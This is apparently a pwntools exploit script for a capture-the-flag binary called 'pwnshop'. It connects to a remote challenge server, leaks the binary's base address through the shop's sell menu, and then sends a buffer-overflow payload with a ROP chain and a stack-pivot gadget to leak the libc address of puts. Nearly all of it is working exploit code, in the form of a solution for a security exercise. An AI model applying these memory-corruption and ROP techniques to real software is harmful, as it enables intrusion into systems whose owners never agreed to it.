from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./pwnshop')

#io = process('./pwnshop')
#io = gdb.debug('./pwnshop', 'break main')
ip, port = '165.232.104.184', 30745
io = remote(ip, port)

io.sendlineafter('>', '2')
io.sendlineafter('What do you wish to sell?', '1')
io.sendlineafter('How much do you want for it?', '123456789')
buf = io.recvline().split('? ')[1]
elf_base = u64(buf[8:].ljust(8,'\x00')) - 0x40c0
print hex(elf_base)

#stack pivot
#the buy function doesn't push rbp! we directly overwrite rip, but only one rop gadget, so need stack pivot
#0x0000000000001219 : sub rsp, 0x28 ; ret

stack_pivot = elf_base + 0x0000000000001219
pop_rdi_ret = elf_base + 0x00000000000013c3
got_puts = elf_base + elf.got.puts
plt_puts = elf_base + 0x1030
ret = elf_base + 0x132a

io.sendlineafter('>', '1')
padding = 'A'*(72-0x28+8)
payload = padding
payload += p64(pop_rdi_ret)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(ret)
payload += 'A'*(0x28-4*8-8)
payload += p64(stack_pivot)
io.sendlineafter('Enter details:', payload)
buf = io.recvline().strip()

print hex(u64(buf.ljust(8,'\x00')))
#get puts address and search in https://libc.blukat.me/

